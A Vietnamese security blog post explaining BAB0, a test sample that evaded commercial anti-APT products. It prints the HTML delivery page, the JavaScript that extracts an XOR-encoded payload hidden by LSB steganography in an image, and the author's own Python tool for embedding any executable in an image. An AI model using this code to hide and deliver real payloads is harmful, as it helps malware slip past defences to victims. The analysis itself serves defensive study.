---
title: 'BAB0 &#8211; Tàng hình trước các hệ thống phòng chống tấn công có chủ đích'
author: tienpp
layout: post
category: news
excerpt: Chưa đầy một tháng trước. MRG Effitas và CrySyS Lab công bố một thông tin gây hoang mang các nhà sản xuất sản phẩm phát hiện tấn công có chủ đích (APT attack detection) như SourceFire (Cisco), Checkpoint, Damballa, Fidelis XPS, FireEye, Fortinet, LastLine, WildFire (Palo Alto), Deep Discovery (Trend Micro) và Websense. Hai ngày trước họ đã công bố các mẫu thử của mình.
thumbnail: /assets/2014/12/Unico_Anello1.png
tags:
  - APT attack
  - APT
  - BAB0
  - malware
---
***Chưa đầy một tháng trước. MRG Effitas và CrySyS Lab công bố một thông tin gây hoang mang các nhà sản xuất sản phẩm phát hiện tấn công có chủ đích (APT attack detection) như SourceFire (Cisco), Checkpoint, Damballa, Fidelis XPS, FireEye, Fortinet, LastLine, WildFire (Palo Alto), Deep Discovery (Trend Micro) và Websense. Hai ngày trước họ đã công bố các mẫu thử của mình. Chúng ta sẽ lượt sơ qua sự kiện này và xem xét mẫu thử của họ làm những gì.***

Tấn công có chủ đích và hệ thống phát hiện tấn công có chủ đích là gì?
----------------------------------------------------------------------

Tấn công có chủ đích (target attack/APT attack - advanced persistent threats) là thể loại tấn công mà mục tiêu là người dùng máy tính (nhân viên của công ty, cá nhân, chính trị gia...) được kẻ tấn công điều tra kĩ lưỡng và có những thủ đoạn tấn công lâu dài, khó phòng chống.

Các cuộc tấn công có chủ đích thường sử dụng các mã khai thác lỗi phần mềm và các phần mềm độc hại để nắm quyền kiểm soát lâu dài đối tượng bị tấn công.

Dựa vào những tính chất trên, các hệ thống chống tấn công có chủ đích chủ yếu hoạt động dựa trên: sự phát hiện dấu hiệu mã khai thác và phần mềm độc hại, phân tích dữ liệu mạng và phát hiện dấu hiệu liên lạc của phần mềm độc hại với trung tâm điều khiển[^detectapt].

bab0 và cách nó qua mặt các hệ thống phòng thủ
----------------------------------------------

Được giới thiệu trong một báo cáo mới đây chưa đầy 1 tháng[^testapt]. bab0 có kết quả kiểm tra là qua mặt tất cả các hệ thống phòng chống tấn công có chủ đích tốt nhất trên thị trường. Mới đây nhóm tác giả, họ đã công bố một mẫu của bab0[^introbab0], với những thiết kế bên trong như sau:

 - Không dùng một mã khai thác nào.
 - Phần mềm độc hại - để kiểm soát đối tượng - được chuyển đến nạn nhân thông qua một trang web giản đơn. Phần mềm này được nhúng trong một tệp ảnh bằng thủ thuật ẩn mình (Steganography). Không một hệ thống/phần mềm chống virus nào phát hiện điều này.
 - Phần mềm độc hại có cơ chế liên lạc với trung tâm điều khiển, cũng bằng cách ẩn các dữ liệu cần lưu chuyển qua các dữ liệu như là người dùng đang duyệt một diễn đàn.

Khám phá bab0
-------------

Bây giờ, chúng ta sẽ xem xét kĩ hơn về mặt bên trong của mẫu bab0 này. Đầu tiên là phần vận chuyển phần mềm điều khiển. Phần này là một trang HTML với một ảnh nền chứa phần mềm độc hại và một nhóm mã javascript để trích phần mềm đó. Giao diện của trang HTML này như hình dưới

![Hình tải về bab0]( {{site.url}}/assets/2014/12/save.png) 

Mã nguồn tệp index.html rất đơn giản:

    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <title>Babo</title>
        <link rel="stylesheet" href="style.css">
        <script src="saver.js"></script>
        <script src="image.js"></script>
      </head>
      <body>
        <img id="foreground" src="hide.png">
      </body>
    </html>

Phần quan trọng nhất có lẽ là phần trích xuất tệp tin từ tệp ảnh nền trong image.js:

    // Getting the pixel data
      var canvas = document.createElement('canvas');
      canvas.width = buttonWidth;
      canvas.height = buttonHeight;
      var context = canvas.getContext("2d");
      context.fillStyle = 'rgba(255,255,255,255)';
      context.fillRect(0, 0, buttonWidth, buttonHeight);
      context.drawImage(img, 0, 0);
      var pixels = context.getImageData(0, 0, buttonWidth, buttonHeight).data;
    
      // Stego
      var bits = [];
      for (var i = 0; i < pixels.length; i++) {
        if (i % 4 != 3) {
          bits.push(pixels[i] & 1);
        }
      }
      var data = new ArrayBuffer((bits.length / 8) | 0);
      var bytes = new Uint8Array(data);
      for (var j = 0; j < bits.length / 8; j++) {
        var byte = 0;
        for (var k = 0; k < 8; k++) {
          byte += bits[j*8+k] << (7-k);
        }
        bytes[j] = byte;
      }
    
      // De-bab0-ing
      var key = [0xba, 0xb0];
      for (var l = 0; l < bytes.byteLength; l++) {
        bytes[l] ^= key[l % key.length]
      }


Đây chỉ là một thủ thuận ẩn giấu thông tin vào hình (LSB steganography) đơn giản: toàn bộ payload được XOR với khóa **0xbab0**. Tôi có viết sẵn một công cụ để tạo ra tệp tin hình chạy được với mã trích xuất này. Các bạn có thể sử dụng để thử nhúng bất kì tệp tin ứng dụng nào vào một tệp hình ảnh ưa thích với khóa bất kì. Nhớ là thay khóa tương ứng vào tệp image.js.

    from PIL import Image
    from bitstring import BitArray
    import math
    
    def xor(m, k):
    	enm = ''
    	for i in range(len(m)):
    		enm += chr(ord(m[i])^ord(k[i%len(k)]))
    	return enm
    	
    def hideBit(pixel, bit):
    	print bit,
    	print int(math.fmod(pixel,2))
    	if int(math.fmod(pixel,2)) != int(bit):
    		pixel = pixel + 1
    	print pixel
    	return pixel
    def pad(ctext):
    	x = len(ctext) % 3
    	print x
    	ctext = ctext + '0'*(3 - x)
    	return ctext
    
    def hideMessage(imgPath, outPath, text, key):
    	##make the cipher text to hide
    	ctext = BitArray(bytes=xor(text, key)).bin
    	ctext = pad(ctext)
    	##set up the image, based on the path
    	img = Image.open(imgPath)
    	pic = img.load()
    
    	##make a list of all pixels
    	pixelList = list(img.getdata())
    
    	if len(ctext) > len(pixelList)*3:
    		print 'image is too small, expected ' + ctext/3 + ' pixels'
    		return 0
    	##loop through the message and hide each bit
    	n = 0
    	for i in range(len(pixelList)):
    		print n, len(ctext)
    		if n >= len(ctext):
    			break
    		##grab the pixel
    		pixel = pixelList[i]
    		##hide the bit in the pixel
    		pixelList[i] = hideBit(pixel[0], ctext[i*3+0]), hideBit(pixel[1],ctext[i*3+1]), hideBit(pixel[2], ctext[i*3+2])
    		print pixelList[i]
    		n += 3
    		#raw_input()
    	##overwrite the new pixels onto the picture
    	img.putdata(pixelList)
    
    	try:
    		img.save(outPath, "PNG")
    	except IOError:
    		print "Unable to write back"
    
    def main():
    	imagePath = 'test.png'
    	outPath = 'hide.png'
    	message = open('file').read()
    	key = 'BB'
    	message = hex(len(message))[2:].rjust(8, '0').decode('hex')[::-1] + message
    	hideMessage(imagePath, outPath, message, key)
    
    	img1 = Image.open(imagePath)
    	img2 = Image.open(outPath)
    
    	print imagePath, img1.format, "%dx%d" % img1.size, img1.mode
    	print outPath, img2.format, "%dx%d" % img2.size, img2.mode
    
    ##Starts executing here
    main()

Sau khi trích xuất ra thì tệp tin được đưa ra dưới dạng tải về, các chi tiết này không có gì quan trọng được thể hiện ở trong tệp image.js

Phần mã độc mà nhóm trên cung cấp chỉ là một giả lập đơn giản, chủ yếu là thử nghiệm cách thức giao tiếp thông qua cách giả là một giao tiếp bình thường tới một diễn đàn là trung tâm điều khiển. Tôi có chạy trong cuckoo sandbox và kết quả ở đây - https://malwr.com/analysis/ZmYyYTVjNzU2YmIyNGFkMzg2MzRiMDRkOGI4ZTEyOTY/ . Đồng thời có đính kèm tệp tin chứa các dữ liệu mạng khi chạy bab0 ở đây - http://www.mediafire.com/download/hba7hpx84pass3w/babo.pcapng

[^detectapt]: [Detecting](http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-detecting-apt-activity-with-network-traffic-analysis.pdf)  APT Activity with Network Traffic Analysis

[^testapt]: [An independent test](https://blog.mrg-effitas.com/wp-content/uploads/2014/11/Crysys_MRG_APT_detection_test_2014.pdf) of APT attack detection appliances

[^introbab0]: [Anti-APT product test sample "BAB0"](http://blog.crysys.hu/2014/12/anti-apt-product-test-sample-bab0-is-shared-for-security-experts/) is shared for security experts
